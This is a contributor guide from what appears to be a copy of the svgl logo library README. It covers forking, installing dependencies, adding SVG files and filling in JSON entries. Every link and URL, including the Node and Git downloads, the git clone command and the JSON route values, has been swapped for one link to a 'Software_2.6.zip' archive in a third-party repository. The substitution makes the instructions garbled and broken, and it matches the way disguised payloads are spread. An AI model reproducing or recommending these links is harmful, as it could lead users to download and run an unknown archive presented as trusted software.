## üöÄ Getting Started

> [!IMPORTANT]
> Before submitting the SVG, **make sure that you have permission** or that the license of the SVG allows you to add it to svgl. If you are not sure, please contact the company or author.

You will need:

- [https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip 18+ (recommended 20 LTS)](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip).
- [Git](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip).

1. [Fork](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip) this repository and clone it locally:

```bash
git clone https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip
```

2. Install dependencies:

```bash
# Install pnpm globally if you don't have it:
npm install -g pnpm

# and install dependencies:
pnpm install
```

3. Go to the [**`static/library`**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip) folder and add your `.svg` logo.

> [!WARNING]
>
> - Remember to optimize SVG for web, you can use [SVGOMG](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip).
> - When you optimize the SVG, make sure that the `viewBox` is not removed.
> - The size limit for each .svg is **20kb**.

4. Go to the [**`https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip`**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip) and add the information about your logo, following the structure:

- **Simple logo**:

```json
{
  "title": "Title",
  "category": "Category",
  "route": "https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip",
  "url": "Website"
}
```

- **Logo + wordmark** version:

```json
{
  "title": "Title",
  "category": "Category",
  "route": "https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip",
  "wordmark": "https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip",
  "url": "Website"
}
```

- **Logo + wordmark** & **light + dark mode**:

```json
{
  "title": "Title",
  "category": "Category",
  "route": {
    "light": "https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip",
    "dark": "https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip"
  },
  "wordmark": {
    "light": "https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip",
    "dark": "https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip"
  },
  "url": "Website"
}
```

> [!NOTE]
>
> - The list of categories is here: [`https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip`](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip). You can add a new category if you need it.
> - You can add multiple categories to the same logo, for example: `"category": ["Social", "Design"]`.

And create a pull request with your logo üöÄ.

5. (Optional) If you want to run the [API](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip) locally, you will need to create a `.env` file in the root of the project with the following variables:

- [Create a Upstash account](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip).
- [Create a Upstash Redis Database](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/src/routes/directory/Software_2.6.zip).

```bash
SVGL_API_REQUESTS = 1
UPSTASH_REDIS_URL = ""
UPSTASH_REDIS_TOKEN = ""
```
